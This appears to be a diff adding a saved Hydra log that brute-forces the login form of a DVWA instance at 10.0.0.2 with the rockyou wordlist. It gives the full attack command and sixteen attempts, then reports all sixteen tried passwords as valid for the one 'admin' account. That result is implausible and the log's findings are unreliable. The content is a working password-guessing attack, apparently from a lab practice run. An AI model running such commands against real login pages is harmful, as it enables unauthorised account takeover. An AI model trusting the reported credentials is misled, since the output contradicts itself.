@@ -1,0 +1,42 @@
+Hydra v9.6 (c) 2024 by van Hauser/THC & David Maciejak
+Command: hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.2 http-get-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
+Target: 10.0.0.2
+Login: admin
+Wordlist: /usr/share/wordlists/rockyou.txt (14,344,399 entries)
+
+[ATTEMPT] target 10.0.0.2 - login "admin" - pass "123456"    -  1 of 14344399 [child  0] (0/0)
+[ATTEMPT] target 10.0.0.2 - login "admin" - pass "12345"     -  2 of 14344399 [child  1] (0/0)
+[ATTEMPT] target 10.0.0.2 - login "admin" - pass "123456789" -  3 of 14344399 [child  2] (0/0)
+[ATTEMPT] target 10.0.0.2 - login "admin" - pass "password"  -  4 of 14344399 [child  3] (0/0)
+[ATTEMPT] target 10.0.0.2 - login "admin" - pass "iloveyou"  -  5 of 14344399 [child  4] (0/0)
+[ATTEMPT] target 10.0.0.2 - login "admin" - pass "princess"  -  6 of 14344399 [child  5] (0/0)
+[ATTEMPT] target 10.0.0.2 - login "admin" - pass "1234567"   -  7 of 14344399 [child  6] (0/0)
+[ATTEMPT] target 10.0.0.2 - login "admin" - pass "rockyou"   -  8 of 14344399 [child  7] (0/0)
+[ATTEMPT] target 10.0.0.2 - login "admin" - pass "12345678"  -  9 of 14344399 [child  8] (0/0)
+[ATTEMPT] target 10.0.0.2 - login "admin" - pass "abc123"    - 10 of 14344399 [child  9] (0/0)
+[ATTEMPT] target 10.0.0.2 - login "admin" - pass "nicole"    - 11 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 10.0.0.2 - login "admin" - pass "daniel"    - 12 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 10.0.0.2 - login "admin" - pass "babygirl"  - 13 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 10.0.0.2 - login "admin" - pass "monkey"    - 14 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.0.0.2 - login "admin" - pass "lovely"    - 15 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 10.0.0.2 - login "admin" - pass "jessica"   - 16 of 14344399 [child 15] (0/0)
+
+[80][http-get-form] host: 10.0.0.2   login: admin   password: 123456
+[80][http-get-form] host: 10.0.0.2   login: admin   password: 12345
+[80][http-get-form] host: 10.0.0.2   login: admin   password: password
+[80][http-get-form] host: 10.0.0.2   login: admin   password: iloveyou
+[80][http-get-form] host: 10.0.0.2   login: admin   password: princess
+[80][http-get-form] host: 10.0.0.2   login: admin   password: 1234567
+[80][http-get-form] host: 10.0.0.2   login: admin   password: rockyou
+[80][http-get-form] host: 10.0.0.2   login: admin   password: 12345678
+[80][http-get-form] host: 10.0.0.2   login: admin   password: nicole
+[80][http-get-form] host: 10.0.0.2   login: admin   password: 123456789
+[80][http-get-form] host: 10.0.0.2   login: admin   password: abc123
+[80][http-get-form] host: 10.0.0.2   login: admin   password: daniel
+[80][http-get-form] host: 10.0.0.2   login: admin   password: babygirl
+[80][http-get-form] host: 10.0.0.2   login: admin   password: monkey
+[80][http-get-form] host: 10.0.0.2   login: admin   password: lovely
+[80][http-get-form] host: 10.0.0.2   login: admin   password: jessica
+
+1 of 1 target successfully completed, 16 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-02 14:59:47
